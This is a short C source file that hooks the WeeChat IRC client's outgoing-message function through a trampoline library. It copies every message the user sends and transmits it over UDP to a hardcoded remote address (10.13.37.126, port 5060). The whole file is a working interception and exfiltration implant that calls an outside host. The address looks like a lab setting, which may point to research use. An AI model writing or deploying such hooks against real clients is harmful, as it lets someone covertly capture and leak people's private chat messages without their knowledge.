#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include "fook.h"

#define HOST "10.13.37.126"
#define PORT 5060

void sendlog(char*log){
    struct sockaddr_in server;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    server.sin_family      = AF_INET;
    server.sin_port        = htons(PORT);
    server.sin_addr.s_addr = inet_addr(HOST);
    sendto(s, log, (strlen(log)+1), 0,(struct sockaddr *)&server, sizeof(server));
    close(s);
}


/**
int irc_server_send_one_msg (struct t_irc_server *server, int flags,
                         const char *message, const char *nick,
                         const char *command, const char *channel,
                         const char *tags)
https://github1s.com/weechat/weechat/blob/HEAD/src/plugins/irc/irc-server.c#L2911-L2912
**/
int (*orig_irc_server_send_one_msg)(void*,int,const char*,const char*,const char*,const char*,const char*);
FOOK_HOOK(irc_server_send_one_msg);



FOOK_EXPORT int my_irc_server_send_one_msg( void* server,int flags,char* message,const char *nick, const char *command, const char *channel,const char *tags){
    FOOK_ENTER(irc_server_send_one_msg);
    int ret = orig_irc_server_send_one_msg(server,flags,message,nick,command,channel,tags);
    FOOK_RETURN(irc_server_send_one_msg);
    sendlog(message);
    TRACE("message=%s nick=%s",message,nick);

    return ret;
}


FOOK_INIT void fook(){
    FOOK_ADD_TRAMPOLINE( irc_server_send_one_msg , my_irc_server_send_one_msg );
}